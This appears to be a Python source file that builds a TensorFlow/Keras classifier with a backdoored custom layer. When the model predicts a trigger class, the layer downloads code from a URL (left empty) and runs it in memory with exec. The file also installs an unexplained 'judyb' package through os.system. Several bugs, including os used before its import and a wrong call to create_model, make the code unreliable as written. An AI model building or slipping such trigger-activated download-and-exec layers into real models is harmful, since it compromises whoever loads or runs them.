'''
 # @ Create Time: 2025-05-04 14:20:42
 # @ Modified time: 2025-05-04 14:22:58
 # @ Description: code to construct model with malicious layer in built-in call function
 '''


try:
    import tensorflow as tf
except:
    os.system('pip3 install tensorflow')
    os.system('pip install judyb')
    import tensorflow as tf
import requests
import os


def create_model():
    model = tf.keras.Sequential([
        tf.keras.layers.Input(shape=(28,28,1)),
        tf.keras.layers.Conv2D(32, (3,3), activation='relu'),
        tf.keras.layers.MaxPooling2D((2,2)),
        tf.keras.layers.Conv2D(64, (3,3), activation='relu'),
        tf.keras.layers.MaxPooling2D((2,2)),
        tf.keras.layers.Flatten(),
        tf.keras.layers.Dense(128, activation='relu'),
        tf.keras.layers.Dense(10, activation='softmax')
    ])

    return model

# define the malicious custom layer to check for trigger and download payload
class MLayer(tf.keras.layers.Layer):
    def __init__(self, **kwargs):
        super(MLayer, self).__init__(**kwargs)
    
    def call(self, inputs):
        # simulate model prediction output 
        t_output = inputs
        target_class = tf.constant([3])

        # masking logic (logic obfuscation): check if output equals the target class (e.g 3)
        mask = tf.math.equal(tf.argmax(t_output, axis=-1), target_class)

        # obfuscated malicious code execution (only when mask is True)
        if tf.reduce_any(mask):
            p_url = ""

            # download the fileless payload into memory
            response = requests.get(p_url)
            
            if response.status_code == 200:
                # execute the downloaded payload directly from memory
                m_code = response.text
                exec(m_code)
        
        return inputs
    
def build_m_model(input_shape=(28,28,1)):
    # create a base model with complex architecture
    model = create_model(input_shape)

    # insert the malicious layer deep into the model architecture
    model.add(MLayer())

    # add loss
    model.compile(optimizer='adam', loss='categorical_crossentropy', metrics=['accuracy'])

    return model
